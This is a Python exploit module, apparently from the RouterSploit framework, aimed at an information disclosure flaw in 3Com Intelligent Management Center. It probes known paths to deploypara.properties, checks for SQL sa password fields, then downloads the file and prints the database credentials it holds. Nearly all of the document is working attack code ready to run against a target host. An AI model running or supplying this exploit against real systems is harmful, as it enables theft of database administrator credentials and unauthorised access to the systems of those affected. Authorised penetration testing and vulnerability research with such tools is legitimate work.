# rsf exploit module
# description: Exploits 3Com Intelligent Management Center information disclosure vulnerability that allows to fetch credentials for SQL sa account

import requests

class Exploit:
    __info__ = {
        "name": "3Com IMC Info Disclosure",
        "description": "Exploits 3Com Intelligent Management Center information disclosure vulnerability that allows to fetch credentials for SQL sa account",
        "authors": (
            "Richard Brain",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/12680/",
        ),
        "devices": (
            "3Com Intelligent Management Center",
        ),
    }

    def __init__(self, target, port=8080):
        self.target = target
        self.port = port
        self.paths = [
            "/imc/reportscript/sqlserver/deploypara.properties",
            "/rpt/reportscript/sqlserver/deploypara.properties",
            "/imc/reportscript/oracle/deploypara.properties"
        ]
        self.valid = None

    def run(self):
        if self.check():
            print("Target seems to be vulnerable")
            print("Sending request to download sensitive information")
            response = requests.get(f"http://{self.target}:{self.port}{self.valid}")

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print(f"Reading {self.valid}")
                print(response.text)
            else:
                print("Exploit failed - could not retrieve response")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def check(self):
        for path in self.paths:
            response = requests.get(f"http://{self.target}:{self.port}{path}")
            if response is None:
                continue

            if any(map(lambda x: x in response.text, ["report.db.server.name", "report.db.server.sa.pass", "report.db.server.user.pass"])):
                self.valid = path
                return True  # target is vulnerable

        return False  # target not vulnerable

